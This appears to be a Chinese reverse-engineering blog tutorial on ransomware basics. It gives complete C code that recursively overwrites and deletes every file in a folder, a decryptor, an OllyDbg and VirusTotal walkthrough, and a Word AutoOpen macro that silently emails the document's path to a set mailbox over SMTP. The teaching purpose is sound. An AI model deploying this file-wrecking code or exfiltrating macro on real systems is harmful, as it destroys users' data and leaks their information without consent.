# 原创
：  [安全攻防进阶篇] 五.逆向分析之Win32 API获取及加解密目录文件、OllyDbg逆向其原理

# [安全攻防进阶篇] 五.逆向分析之Win32 API获取及加解密目录文件、OllyDbg逆向其原理

前文作者讲解了条件语句和循环语句源码还原及流程控制逆向方法，这篇文章将分享勒索病毒，通过编写程序实现获取Windows系统目录文件，并对其进行加密和解密的过程；第二部分详细讲解了OllyDbg和在线沙箱的逆向分析过程，第三部分分享恶意软件如何通过宏脚本发送勒索信息或密码至用户邮箱。基础性文章，希望对您有所帮助~

从2019年7月开始，我来到了一个陌生的专业——网络空间安全。初入安全领域，是非常痛苦和难受的，要学的东西太多、涉及面太广，但好在自己通过分享100篇“网络安全自学”系列文章，艰难前行着。感恩这一年相识、相知、相趣的安全大佬和朋友们，如果写得不好或不足之处，还请大家海涵！

接下来我将开启新的安全系列，叫“安全攻防进阶篇”，也是免费的100篇文章，作者将更加深入的去研究恶意样本分析、逆向分析、内网渗透、网络攻防实战等，也将通过在线笔记和实践操作的形式分享与博友们学习，希望能与您一起进步，加油~

话不多说，让我们开始新的征程吧！您的点赞、评论、收藏将是对我最大的支持，感恩安全路上一路前行，如果有写得不好或侵权的地方，可以联系我删除。基础性文章，希望对您有所帮助，作者目的是与安全人共同进步，也强烈推荐大家去看看钱老师的视频，加油~

#### 文章目录

**作者的github资源：**<br/> 软件安全：[https://github.com/eastmountyxz/Software-Security-Course](https://github.com/eastmountyxz/Software-Security-Course)<br/> 其他工具：[https://github.com/eastmountyxz/NetworkSecuritySelf-study](https://github.com/eastmountyxz/NetworkSecuritySelf-study)<br/> Windows-Hacker：[https://github.com/eastmountyxz/Windows-Hacker-Exp](https://github.com/eastmountyxz/Windows-Hacker-Exp)

> 
声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。（参考文献见后）


前文回顾：<br/> [[安全攻防进阶篇] 一.什么是逆向分析、逆向分析应用及经典扫雷游戏逆向](https://blog.csdn.net/Eastmount/article/details/107591832)<br/> [[安全攻防进阶篇] 二.如何学好逆向分析、逆向路线推荐及吕布传游戏逆向案例](https://blog.csdn.net/Eastmount/article/details/107650949)<br/> [[安全攻防进阶篇] 三.OllyDbg和Cheat Engine工具逆向分析植物大战僵尸游戏](https://blog.csdn.net/Eastmount/article/details/107678362)<br/> [[安全攻防进阶篇] 四.逆向分析之条件语句和循环语句源码还原及流程控制逆向](https://blog.csdn.net/Eastmount/article/details/107690664)

#### 文章目录

---


## 一.PE病毒和WannaCry勒索蠕虫

### 1.PE病毒

**什么是PE病毒？**<br/> PE病毒是以Windows PE程序为载体，能寄生于PE文件或Windows系统的病毒程序。PE病毒数量非常之多，包括早起的CIH病毒，全球第一个可以破坏计算机硬件的病毒，它会破坏主办的BIOS，对其数据进行擦写修改。再比如熊猫烧香、机器狗等等，其危害非常之大。

**什么叫感染？**<br/> 说到病毒，不得不提感染。感染是指在尽量不影响目标程序（系统）正常功能的前提下，而使其具有病毒自身的功能。什么叫病毒自身的功能呢？一个病毒通常包括如下模块：

**CIH病毒**<br/> CIH病毒是一种能够破坏计算机系统硬件的恶性病毒。这个病毒产自TW，原集嘉通讯公司工程师陈盈豪在其于TW大同工学院念书期间制作。最早随国际两大盗版集团贩卖的盗版光盘在欧美等地广泛传播，随后进一步通过网络传播到全世界各个角落。CIH的载体是一个名为“ICQ中文Chat模块”的工具，并以热门盗版光盘游戏如“古墓奇兵”或Windows95/98为媒介，经互联网各网站互相转载，使其迅速传播。目前传播的主要途径主要通过Internet和电子邮件，当然随着时间的推移，其传播主要仍将通过软盘或光盘途径。

CIH病毒曾入榜全球十大计算机病毒之首，该病毒引起了许多重要部门的严密关注，其原因不言而喻。如果指挥、通信、政务等系统受到了CIH病毒的威胁甚至破坏，其后果不堪设想。

如果我们要编写PE病毒，则需要掌握以下的关键：

---


### 2.PE病毒的分类

以感染目标进行分类，包括：

**(1) 文件感染**<br/> 将代码寄生在PE文件，病毒本身只是PE文件的一部分，依赖于感染目标，通常也叫HOST文件，控制权获得也是以目标程序运行来获得的。分为：

**(2) 系统感染**<br/> 将代码或程序寄生在Windows操作系统，该类病毒越来越多，它不感染具体文件，但是它会在操作系统中保存自己的实体。同时也可以通过系统启动的方法来获取控制权。传播途径包括：

推荐作者前文：

### 3.勒索病毒

勒索病毒主要功能是遍历电脑上所有文件，并且用加密算法加密，然后把加密密钥发送到自己的邮箱里，弹出对应的窗口勒索从而解密。典型的是WannaCry病毒，作者在“网络安全自学篇”中详细介绍过它的分析过程，也推荐大家去学习。

2017年5月12日，WannaCry蠕虫通过永恒之蓝MS17-010漏洞在全球范围大爆发，感染大量的计算机。WannaCry勒索病毒全球大爆发，至少150个国家、30万名用户中招，造成损失达80亿美元，已影响金融、能源、医疗、教育等众多行业，造成严重的危害。

WannaCry是一种“蠕虫式”勒索病毒软件，由不法分子利用NSA泄露方程式工具包的危险漏洞“EternalBlue”（永恒之蓝）进行传播。该蠕虫感染计算机后会向计算机中植入敲诈者病毒，导致电脑大量文件被加密。

WannaCry利用Windows系统的SMB漏洞获取系统的最高权限，该工具通过恶意代码扫描开放445端口的Windows系统。被扫描到的Windows系统，只要开机上线，不需要用户进行任何操作，即可通过共享漏洞上传WannaCry勒索病毒等恶意程序。

WannaCry利用永恒之蓝漏洞进行网络端口扫描攻击，目标机器被成功攻陷后会从攻击机下载WannaCry木马进行感染，并作为攻击机再次扫描互联网和局域网的其他机器，行成蠕虫感染大范围超快速扩散。

木马母体为mssecsvc.exe，运行后会扫描随机IP的互联网机器，尝试感染，也会扫描局域网相同网段的机器进行感染传播，此外会释放敲诈者程序tasksche.exe，对磁盘文件进行加密勒索。

木马加密使用AES加密文件，并使用非对称加密算法RSA 2048加密随机密钥，每个文件使用一个随机密钥，理论上不可PJ。同时@WanaDecryptor@.exe显示勒索界面。其核心流程如下图所示：

WannaCry勒索病毒主要行为是传播和勒索。

---


## 二.获取系统文件及加密处理

前面第一部分简单普及了病毒和勒索的基本概念，它们都与感染、加密、解密、传播、勒索等关键词密切相关，接下来我将带着大家实现最简单的系统文件加密及解密功能。只有掌握了这些基本知识，才能更好地服务于我们的逆向分析工程。

> 
<font color="red">**注意：这里仅允许大家加密自己电脑的文件夹或者在虚拟机中进行实验，不要去恶意损坏他人的计算机设备，一切破坏和攻击行为后果自负。**</font>


假设桌面存在如下图所示的文件“文件夹加密”，我们需要获取其信息再进行文件遍历及加密操作。

**PS：建议大家创建一个新的文件夹，并复制一些无效文件进去测试。**

**第一步，创建Windows控制台程序。**

**第二步，在编写一个简单的加密函数前，首先需要创建文件并执行打开、读写操作。**

```
#include &lt;stdio.h&gt;

//文件加密函数
void jiami(char* fileName)
{
	//1.打开文件
	FILE* fp = NULL;                  //文件指针变量
	fp = fopen(fileName, "r+");       //打开可读写的文件
	if (NULL == fp) {
		printf("打开文件失败\n");
		return;
	}
	printf("打开 %s 文件成功!\n", fileName);

	//2.获取文件大小

	//3.每隔一个字节插入一个字节数据
	
	//4.保存关闭
}

int main()
{
	jiami("C:\\Users\\xiuzhang\\Desktop\\文件夹加密\\test.txt");
	return 0;
}

```

运行结果如下图所示：

注意，如果提示传递参数不兼容需要进行如下设置。

同时，如果提示错误“error C4996: ‘fopen’: This function or variable may be unsafe. ”，则因为VS认为fopen函数是不安全的，需要如下设置：

**第三步，计算文件大小，该文件共35个字节。**<br/> 基本流程为：

```
#include &lt;stdio.h&gt;

//文件加密函数
void jiami(char* fileName)
{
	FILE* fp = NULL;                  //文件指针变量
	int size = 0;                     //文件大小

	//1.打开文件
	fp = fopen(fileName, "r+");       //打开可读写的文件
	if (NULL == fp) {
		printf("打开文件失败\n");
		return;
	}
	printf("打开 %s 文件成功!\n", fileName);

	//2.获取文件大小
	fseek(fp, 0, SEEK_END);                   //设置光标到文件末尾
	size = ftell(fp);                         //计算光标位置距离文件头字节数
	fseek(fp, 0, SEEK_SET);                   //设置光标位置到文件头
	printf("文件大小为：%d字节！\n", size);
	
	//3.每隔一个字节插入一个字节数据
	
	//4.保存关闭
}

int main()
{
	jiami("C:\\Users\\xiuzhang\\Desktop\\文件夹加密\\test.txt");
	return 0;
}

```

输出结果如下图所示：

**第四步，循环插入字节实现简单的加密。**<br/> 如果我们在进行文件操作时，遇到权限不够的情况，需要进行相关提权操作，再进行加密处理。核心函数如下：

```
//文件加密函数 参数-文件名字
void jiami(char* fileName)
{
	FILE* fp = NULL;                  //文件指针变量
	int size = 0;                     //文件大小

	//1.打开文件
	fp = fopen(fileName, "r+");       //打开可读写的文件
	if (NULL == fp) {
		printf("打开文件失败\n");
		return;
	}
	printf("打开 %s 文件成功!\n", fileName);

	//2.获取文件大小
	fseek(fp, 0, SEEK_END);                   //设置光标到文件末尾
	size = ftell(fp);                         //计算光标位置距离文件头字节数
	fseek(fp, 0, SEEK_SET);                   //设置光标位置到文件头
	printf("文件大小为：%d字节！\n", size);

	//3.获取文件所有内容
	char* tmp;
	int read_size;
	tmp = (char*)malloc((size + 1) * sizeof(char));
	read_size = fread(tmp, sizeof(char), size, fp);
	tmp[size] = '\0';
	//printf("读取字符串为：%s %d %d\n", tmp, read_size, strlen(tmp));

	//4.每隔一个字节插入一个字节数据
	char ch;
	char code = 'a';
	char* pTxt;
	FILE* fpw = fopen("ddd.txt", "w");                           //写入文件
	pTxt = (char*)malloc(sizeof(char) * (strlen(tmp) * 2 + 1));

	for (int i = size; i &gt;= 0; i--) {
		ch = tmp[i];
		if (i != 0) {
			pTxt[2 * i] = ch;
			pTxt[2 * i - 1] = code;
		}
		else {
			pTxt[2 * i] = ch;
		}
		//printf("%d %c %c\n", i, ch, pTxt[2 * i - 1]);
	}
	pTxt[size * 2] = '\0';
	printf("操作后字符串：%s %d\n", pTxt, strlen(pTxt));
	fwrite(pTxt, sizeof(char), size * 2, fpw);

	//保存关闭
	fclose(fp);
	fclose(fpw);
	return;
}

```

运行程序后，我们打开test.txt查看如下，发现一个简单的加密或扰乱完成，变成了一堆乱码。当加密函数写好之后，我们接着需要编写一个遍历文件夹的函数，实现对整个目录进行加密处理。

**<mark>注意，这里仅允许大家加密自己电脑的文件夹或者在虚拟机中进行实验，不要去恶意损坏他人的计算机设备，一切破坏和攻击行为后果自负。</mark>**

**第五步，编写遍历文件夹函数。**<br/> 通常遍历文件夹采用的是递归方法，依次遍历某个目录的文件夹，深度搜索文件夹中的内容，如果是文件就加密，如果是文件夹就继续深度搜索，直至找到文件依次返回，从而实现整个目录的文件遍历。

```
//遍历文件夹找到每个文件 参数-文件夹名字
void findFile(char* pathName)
{
	/* 禁止加密他人计算机,一定只能对指定目录加密,尤其不能对C盘加密 */
	//设置要找的文件名 通配符实现
	char findFileName[256];
	memset(findFileName, 0, 256);                   //清空数组
	sprintf(findFileName, "%s\\*.*", pathName);
	printf("要找的文件名是：%s\n", findFileName);
	return;
}

int main()
{
	//jiami("C:\\Users\\xiuzhang\\Desktop\\文件夹加密\\test.txt");
	//获取当前文件夹
	char buff[256] = { 0 };
	GetCurrentDirectory(256, buff);
	printf("当前目录是：%s\n\n", buff);
	return 0;
}

```

上述代码通过自定义函数遍历文件夹，同时调用API函数获取当前目录，核心函数为：

输出结果如下图所示：

**第六步，进一步完善遍历文件夹递归调用函数。**

```
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;windows.h&gt;
#include &lt;stdlib.h&gt;

//遍历文件夹找到每个文件 参数-文件夹名字
void findFile(char* pathName)
{
	/* 禁止加密他人计算机,一定只能对指定目录加密,尤其不能对C盘加密 */

	//1.设置要找的文件名 通配符实现
	char findFileName[256];
	memset(findFileName, 0, 256);                   //清空数组
	sprintf(findFileName, "%s\\*.*", pathName);
	printf("要找的文件名是：%s\n", findFileName);

	//2.获取目录下第一个文件
	WIN32_FIND_DATA findData;                    //定义结构体
	HANDLE hFile = FindFirstFile(findFileName, &amp;findData);
	//判断返回值等于-1(INVALID_HANDLE_VALUE)
	if (INVALID_HANDLE_VALUE == hFile) {
		printf("查找文件失败!\n");
		return;
	}
	//如果成功进入死循环继续查找下一个文件
	else {
		int ret = 1;
		char temp[256];
		while (ret) {
			//如果找到的是个文件夹 则需要继续查找该文件夹内容
			if (findData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
				//文件夹拼接=原始路径+新文件夹路径
				memset(temp, 0, 256);
				sprintf(temp, "%s\\%s", pathName, findData.cFileName);
				printf("找到一个文件夹：%s\n", temp);
				Sleep(1000);                             //暂停1秒钟
				findFile(temp);
			}
			else { //如果是文件 则加密文件
				memset(temp, 0, 256);
				sprintf(temp, "%s\\%s", pathName, findData.cFileName);
				printf("找到一个文件：%s\n", temp);

			}
			//查找下一个文件
			ret = FindNextFile(hFile, &amp;findData);
		}
	}
	return;
}

int main()
{
	//获取当前文件夹
	char buff[256] = { 0 };
	GetCurrentDirectory(256, buff);
	printf("当前目录是：%s\n\n", buff);
	findFile(buff);

	return 0;
}

```

<mark>在写代码过程中，我们一定要学会边写边调试，或者称为打桩输出，而不是一写到底最后来慢慢修改。此时运行程序，它输出遍历当前目录的文件夹结果如下图所示，为什么会一直在递归呢？</mark>

注意这里的 “.” 代表当前文件夹，所以需要过滤掉该点，否则陷入无限递归。

最终运行结果如下图所示，将当前文件夹内所有内容显示出来。

比如Debug文件夹中内容，和我们的获取结果是一一对应的。

**第七步，实现文件加密功能。**<br/> 作者将文件夹改为指定的目录，再次强调虚拟机中运行或者指定某个不重要的文件夹进行测试。具体修改是在findFile函数中增加了jiami函数的调用。

注意： 使用二进制打开可以复制大型文件如.exe文件、音频视频文件等，所以文件操作改为“rb”和“wb”。由于某些文件会很大，我们文件读写换了一种操作，**按字符读入及写入**。每一种写法和优化都是有原因的，这个过程需要你去慢慢琢磨，包括逆向分析也一样，操作系统或编译器、恶意代码为什么这么优化，我们都需要慢慢去分析。

**<mark>完整代码如下：</mark>**

```
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;windows.h&gt;
#include &lt;stdlib.h&gt;

//文件加密函数 参数-文件名字
void jiami(char* fileName, char* pathName)
{
	FILE* fp = NULL;                  //文件指针变量
	int size = 0;                     //文件大小

	//打开文件
	//注意： 使用二进制打开可以复制大型文件如.exe文件，音频视频文件等
	fp = fopen(fileName, "rb");       //打开可读写的文件
	if (NULL == fp) {
		printf("打开文件失败\n");
		return;
	}
	printf("打开 %s 文件成功!\n", fileName);

	//获取文件大小
	fseek(fp, 0, SEEK_END);                   //设置光标到文件末尾
	size = ftell(fp);                         //计算光标位置距离文件头字节数
	fseek(fp, 0, SEEK_SET);                   //设置光标位置到文件头
	printf("文件大小为：%d字节！\n", size);

	//获取文件所有内容
	char code = 'a';
	char ch;
	char temp[256];
	memset(temp, 0, 256);
	sprintf(temp, "%s\\%s", pathName, "test");
	printf("%s\n", temp);

	FILE* fpw = fopen(temp, "wb");         //写入文件
	while (!feof(fp)) { 
		ch = fgetc(fp);
		fputc(ch, fpw);
		fputc(code, fpw);
		//printf("%c\n", ch);
	}

	//保存关闭
	fclose(fp);
	fclose(fpw);

	//替换文件
	char commend[1024];
	memset(commend, 0, 1024);
	sprintf(commend, "del \"%s\"", fileName);     //访问路径包含空格增加双引号
	printf("%s\n", commend);
	system(commend);
	rename(temp, fileName);                       //调用C语言rename函数重命名文件
	printf("\n");
	return;
}

//遍历文件夹找到每个文件 参数-文件夹名字
void findFile(char* pathName)
{
	/* 禁止加密他人计算机,一定只能对指定目录加密,尤其不能对C盘加密 */
	//1.设置要找的文件名 通配符实现
	char findFileName[256];
	memset(findFileName, 0, 256);                   //清空数组
	sprintf(findFileName, "%s\\*.*", pathName);
	printf("要找的文件名是：%s\n", findFileName);

	//2.获取目录下第一个文件
	WIN32_FIND_DATA findData;                    //定义结构体
	HANDLE hFile = FindFirstFile(findFileName, &amp;findData);
	//判断返回值等于-1(INVALID_HANDLE_VALUE)
	if (INVALID_HANDLE_VALUE == hFile) {
		printf("查找文件失败!\n");
		return;
	}
	//如果成功进入死循环继续查找下一个文件
	else {
		int ret = 1;
		char temp[256];
		while (ret) {
			//如果找到的是个文件夹 则需要继续查找该文件夹内容
			if (findData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
				if(findData.cFileName[0] != '.') {
					//文件夹拼接=原始路径+新文件夹路径
					memset(temp, 0, 256);
					sprintf(temp, "%s\\%s", pathName, findData.cFileName);
					printf("找到一个文件夹：%s\n", temp);
					Sleep(1000);                             //暂停1秒钟
					findFile(temp);
				}
			}
			else { //如果是文件 则加密文件
				memset(temp, 0, 256);
				sprintf(temp, "%s\\%s", pathName, findData.cFileName);
				printf("找到一个文件：%s\n", temp);
				//加密文件
				jiami(temp, pathName);
			}
			//查找下一个文件
			ret = FindNextFile(hFile, &amp;findData);
		}
	}
	return;
}

int main()
{
	char buff[256] = { 0 };
	GetCurrentDirectory(256, buff);
	printf("当前目录是：%s\n\n", buff);
	//加密指定文件夹目录 建议使用虚拟机执行
	findFile("C:\\Users\\xiuzhang\\Desktop\\文件夹加密");

	return 0;
}

```

最终实现效果如下图所示：

指定目录的所有文件已经被加密，图片已经不能显示、EXE程序也不能执行。

图片打开提示“图片错误，无法打开”，EXE程序也无法执行。

接着我们用010editor软件打开加密文件，具体的内容显示如下图所示：

<mark>注意，某次执行代码没修改加密文件夹，将VS当前目录全部加密，工程直接奔溃，最终重新创建工程，所以大家仅能试试指定目录来学习加密和解密原理知识。</mark>

**第八步，编写解密功能。**<br/> 当我们中了勒索病毒，就需要解密，这里我们简单给大家编写一个解密函数。当然，真实环境中，MD5、hash、SHA-1都是比较常用的加密算法。解密文件写有两种方法：

这里由于作者知道加密规则，则进行单个字符奇偶判断写入的处理，代码如下：

```
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;windows.h&gt;
#include &lt;stdlib.h&gt;

//文件加密函数 参数-文件名字
void jiami(char* fileName, char* pathName)
{
	FILE* fp = NULL;                  //文件指针变量
	int size = 0;                     //文件大小

	//打开文件
	//注意： 使用二进制打开可以复制大型文件如.exe文件，音频视频文件等
	fp = fopen(fileName, "rb");       //打开可读写的文件
	if (NULL == fp) {
		printf("打开文件失败\n");
		return;
	}
	printf("打开 %s 文件成功!\n", fileName);

	//获取文件大小
	fseek(fp, 0, SEEK_END);                   //设置光标到文件末尾
	size = ftell(fp);                         //计算光标位置距离文件头字节数
	fseek(fp, 0, SEEK_SET);                   //设置光标位置到文件头
	printf("文件大小为：%d字节！\n", size);

	//获取文件所有内容
	char code = 'a';
	char ch;
	char temp[256];
	memset(temp, 0, 256);
	sprintf(temp, "%s\\%s", pathName, "test");
	printf("%s\n", temp);

	FILE* fpw = fopen(temp, "wb");         //写入文件
	while (!feof(fp)) { 
		ch = fgetc(fp);
		fputc(ch, fpw);
		fputc(code, fpw);
		//printf("%c\n", ch);
	}
	//保存关闭
	fclose(fp);
	fclose(fpw);

	//替换文件
	char commend[1024];
	memset(commend, 0, 1024);
	sprintf(commend, "del \"%s\"", fileName);     //访问路径包含空格增加双引号
	printf("%s\n", commend);
	system(commend);
	rename(temp, fileName);                       //调用C语言rename函数重命名文件
	printf("\n");
	return;
}

//文件解密函数 参数-文件名字
void jiemi(char* fileName, char* pathName)
{
	char ch;
	int size = 0;                        //文件大小
	FILE* fp;                           //打开文件
	FILE* fpw;                           //写入文件
	char tmp[1024];

	//初始化操作
	memset(tmp, 0, 1024);
	sprintf(tmp, "%s\\tmp", pathName);
	printf("%s\n", tmp);
	fp = fopen(fileName, "rb");
	fpw = fopen(tmp, "wb");
	fseek(fpw, 0, SEEK_SET);             //设置光标位置到文件头

	//每隔一个字节删除一个字节数据
	int i = 0;
	while (!feof(fp)) {
		ch = fgetc(fp);
		if (0 == (i % 2)) { //偶数写入
			i = 1;
			fputc(ch, fpw);
		}
		else {
			i = 0;
			continue;
		}
	}
	fclose(fp);
	fclose(fpw);

	//替换文件
	char commend[1024];
	memset(commend, 0, 1024);
	sprintf(commend, "del \"%s\"", fileName);     //访问路径包含空格增加双引号
	printf("%s\n", commend);
	system(commend);
	rename(tmp, fileName);                       //调用C语言rename函数重命名文件
	printf("\n");
	return;
}

//遍历文件夹找到每个文件 参数-文件夹名字
void findFile(char* pathName)
{
	/* 禁止加密他人计算机,一定只能对指定目录加密,尤其不能对C盘加密 */
	//1.设置要找的文件名 通配符实现
	char findFileName[256];
	memset(findFileName, 0, 256);                   //清空数组
	sprintf(findFileName, "%s\\*.*", pathName);
	printf("要找的文件名是：%s\n", findFileName);

	//2.获取目录下第一个文件
	WIN32_FIND_DATA findData;                    //定义结构体
	HANDLE hFile = FindFirstFile(findFileName, &amp;findData);
	//判断返回值等于-1(INVALID_HANDLE_VALUE)
	if (INVALID_HANDLE_VALUE == hFile) {
		printf("查找文件失败!\n");
		return;
	}
	//如果成功进入死循环继续查找下一个文件
	else {
		int ret = 1;
		char temp[256];
		while (ret) {
			//如果找到的是个文件夹 则需要继续查找该文件夹内容
			if (findData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
				if(findData.cFileName[0] != '.') {
					//文件夹拼接=原始路径+新文件夹路径
					memset(temp, 0, 256);
					sprintf(temp, "%s\\%s", pathName, findData.cFileName);
					printf("找到一个文件夹：%s\n", temp);
					Sleep(1000);                             //暂停1秒钟
					findFile(temp);
				}
			}
			else { //如果是文件 则加密文件
				memset(temp, 0, 256);
				sprintf(temp, "%s\\%s", pathName, findData.cFileName);
				printf("找到一个文件：%s\n", temp);
				//加密文件
				//jiami(temp, pathName);

				//解密文件
				jiemi(temp, pathName);
			}
			//查找下一个文件
			ret = FindNextFile(hFile, &amp;findData);
		}
	}
	return;
}

int main()
{
	char buff[256] = { 0 };
	GetCurrentDirectory(256, buff);
	printf("当前目录是：%s\n\n", buff);
	//加密指定文件夹目录 建议使用虚拟机执行
	findFile("C:\\Users\\xxxxx\\Desktop\\文件夹加密-------------");

	return 0;
}

```

最终成功还原代码，图片和EXE程序又能运行了！

**但是遗憾的是，在文本中涉及中文字符，仍然出现了部分乱码？哈哈！<sup>_</sup>大家告诉我怎么处理呢？感觉需要中文字符两字节判断操作，但也不影响这篇文章分享的加密与解密基础知识。甚至你还可以做一个界面，包含加密按钮和解密按钮，融合Hash、MD5各种算法进行相关操作，这里仅采用命令行的形式告诉大家原理，希望对您有所帮助。**

对比下加密文件：

---


## 三.OllyDbg和在线沙箱逆向分析

### 1.OllyDbg分析

接着我们通过OD打开加密的EXE程序，对其进行简单的逆向分析，显示如下图所示。可以看到有很多CC指令，这是VS2019的一些措施，接着我们尝试简单分析。

第一步，右键选择“查找”-&gt;“当前模块中的名称”，我们尝试查看该EXE执行的函数。

我们可以看到调用的Win32 API函数，如下图所示，调用FindFirstFileA和FindNextNextA函数，应该是在遍历文件目录。同时，包括了文件操作函数fopen、fseek、ftell、memset、fgetc、fputc等。同时包括了一些线程和进程相关的函数。

第二步，选中该函数右键点击“在每个参考上设置断点”。

接着进入对应断点位置进行调试，设置断点函数一般为文件操作、API操作、数据显示等。

第三步，另一种方法是选择“所有模块间的调用”，查看调用的函数信息。

显示结果如下图所示，包括我们使用的FindNextFileA、FindFirstFileA函数，属于Kernel32中；也有Sleep睡眠函数，以及文件操作fopen、fseek、fgetc等。

第四步，我们选中某个函数右键即可设置断点，比如FindNextFileA和FindFirstFileA函数，接着按下B键可以看到已经设置的断点信息。

第五步，接着选中断点选择“反汇编窗口中跟随”。

可以看到对应断点FindNextFileA位置，这是逆向分析对指定模块进行分析的常用方法。

<mark>接着按下F9调试程序，然后停在断点位置，再按下F7进入断点单步调试恶意样本的核心模块，比如该函数获取的参数即为“C:\User\xxxxx\Desktop\文件夹加密”，这就看到了打开该文件夹的目录。</mark>

接续调试我们可以看到参数传递，字符串拼接、睡眠函数等内容，重点是我们要通过CALL分析进入到加密函数中，然后去分析加密的算法从而实现逆向PJ。

程序运行结果如下图所示，我们可以结合输出的结果进行每个功能模块的分析及逆向。

最终，一个简单的逆向分析过程讲解完毕！最重要的是我们通过自己编写加密解密算法，然而再对其进行分析，从而加深我们初学者学习逆向的经验，这里提出几个问题供大家和我思考。

---


### 2.在线沙箱分析

在恶意样本逆向分析中，在线平台给我们提供了强大支撑，我们拿到一个样本之后可以先对其进行在线监测。其操作比较简单，就是将恶意样本上传至指定在想网址即可。常见的在线沙箱分析包括：

我们以 virustotal沙箱为例，打开主页如稀土所示，点击“choose file”，上传我们的勒索exe文件。

结果从72个在线引擎中扫描出4个是恶意样本的引擎，如下图所示：

我们可以看到该样本的基本信息，包括MD5、SHA-1等。

接着是文件历史信息以及PE文件节点信息。

<img alt="在这里插入图片描述" height="350" src="https://img-blog.csdnimg.cn/20200803191257867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center" width="600"/><br/> <br/>

下面有一个重点，是该文件的导入函数信息，在Imports中显示，主要包括：

ucrtbased.dll主要包括的文件操作如下图所示，比如fopen、fputc、system、rename等函数。

如果该样本有恶意家族关联，它也能给出相应的信息。

---


## 四.VB脚本实现邮箱信息发送

当我们中了勒索病毒时，通常会遇到发送信息到指定邮箱或QQ，或者去某个比特币钱包支付的问题，这里通过VB宏脚本简单实现一个向邮箱发送消息的功能，注意宏病毒也是APT攻击中常见的方法（推荐看APT28），这里作者不进行详细赘述。

接下来我们制作一个宏，当对方打开文档时就知道该文档在对方电脑存储的具体路径。常见方法包括：

这里采用CDO自发邮件实现。通过Word VB编写脚本，设置文档打开时运行，利用CDO发送电子邮件将文件的路径和名字发送到指定邮箱中。步骤如下：

首先，定义的宏函数为AutoOpen，如下图所示：

核心代码如下所示：

**完整代码如下，包括获取文件夹路径、定义邮件地址、添加CDO库、设置微软服务器、CDO邮件参数设置、发送数据**

```
Sub AutoOpen()
' AutoOpen宏
' By: CSDN Eastmount 2020-04-21
    
    ' 获取文件夹路径
    Dim WordObj As Object
    Dim Doc As Object
    Set WordObj = GetObject(, "Word.Application")
    Set Doc = WordObj.ActiveDocument
    MsgBox (Doc.Path)
    
    ' 定义邮件地址
    Const from1 = "152xxxxxxxx@163.com"
    Const to1 = "xxxxxxxxxx@qq.com"
    Const password = "xxxxxxxxxx"
    
    ' 添加CDO库
    Set CDO = CreateObject("CDO.Message")
    CDO.from = from1
    CDO.to = to1
    CDO.Subject = Doc.Name
    CDO.Textbody = Doc.Path
    
    ' 微软服务器网址
    MsgBox ("发送邮件")
    Const proxyUrl = "http://schemas.microsoft.com/cdo/configuration/"
    With CDO.Configuration.Fields
        .Item(proxyUrl &amp; "sendusing") = 2                     '发送端口
        .Item(proxyUrl &amp; "smtpserver") = "smtp.163.com"       'SMTP服务器地址
        .Item(proxyUrl &amp; "smtpserverport") = 25               'SMTP服务器端口
        .Item(proxyUrl &amp; "smtpauthenticate") = 1              '是否开启用户名密码验证
        .Item(proxyUrl &amp; "sendusername") = from1              '发送方邮箱名称
        .Item(proxyUrl &amp; "sendpassword") = password           '发送方邮箱密码
        .Item(proxyUrl &amp; "smtpusessl") = True                 '是否使用ssl协议
        .Item(proxyUrl &amp; "smtpconnectiontimeout") = 60        '时延
        .Update
    End With
    
    ' 发送数据
    CDO.Send
    Set CDO = Nothing
    MsgBox ("成功!")
End Sub

```

当test04.doc文件打开时，它会自动运行，其结果如下图所示：

接着对话框提示发送邮件。

最终邮件通过宏病毒发送成功。

下图可见，成功将Word稳定打开的路径地址发送到了目标邮箱，如果宏病毒再获取更详细的信息或文件，是否也能发送到指定邮箱呢？如果是勒索解密的密码或者提示用户支付，是否也可以行呢？所以，这样的恶意代码仍需要重视。

推荐作者前文：

---


## 五.总结

写到这里，这篇文章就介绍完毕，希望对您有所帮助，最后进行简单的总结下。

学安全一年，认识了很多安全大佬和朋友，希望大家一起进步。这篇文章中如果存在一些不足，还请海涵。作者作为网络安全初学者的慢慢成长路吧！希望未来能更透彻撰写相关文章。同时非常感谢参考文献中的安全大佬们的文章分享，深知自己很菜，得努力前行。

**很多朋友问我如何学逆向分析？**<br/> 下面给出推荐的学习路线和安全书籍。软件逆行其实就是搬砖活，你需要的是任性和基本功。可能大佬们会有很多技巧，但我希望你能扎扎实实去躺过那些坑，会看懂代码，会写代码，然后IDA和OD工具（倚天屠龙）用好，每天泡在代码中，肯定能行的。你应该这样学习：<br/> 1.多敲代码，重视实战；<br/> 2.程序不是写出来的，是调出来的；<br/> 3.根据自己兴趣和市场需求做一定规模的项目。

下图开发和逆向项目非常推荐你去完成，开发远控软件有助于你分析木马，CAD软件能提升你C++分析能力，做一个调制器或许反调试就不再那么难，自制一个小操作系统、小编译器、任务管理器，或许逆向原理就懂了。

最后给出了这一年我在网络安全、系统安全和机器学习看过的书，如果你想把AI更好的融入安全领域，看看这些书籍还是挺不错，我也厚着脸皮把自己写的两本Python数据分析书放了进来，哈哈~

**网络安全：**<br/> <img alt="在这里插入图片描述" height="360" src="https://img-blog.csdnimg.cn/20200730143736445.png#pic_center" width="600"/>

**系统安全：**

**AI+安全：**

**编程没有捷径，逆向也没有捷径，它们都是搬砖活，少琢磨技巧，干就对了。什么时候你把攻击对手按在地上摩擦，你就赢了，也会慢慢形成了自己的安全经验和技巧。加油吧，少年希望这个路线对你有所帮助，共勉。**

<mark>2020年8月18新开的“娜璋AI安全之家”，主要围绕Python大数据分析、网络空间安全、人工智能、Web渗透及攻防技术进行讲解，同时分享CCF、SCI、南核北核论文的算法实现。娜璋之家会更加系统，并重构作者的所有文章，从零讲解Python和安全，写了近十年文章，真心想把自己所学所感所做分享出来，还请各位多多指教，真诚邀请您的关注！谢谢。</mark>

---


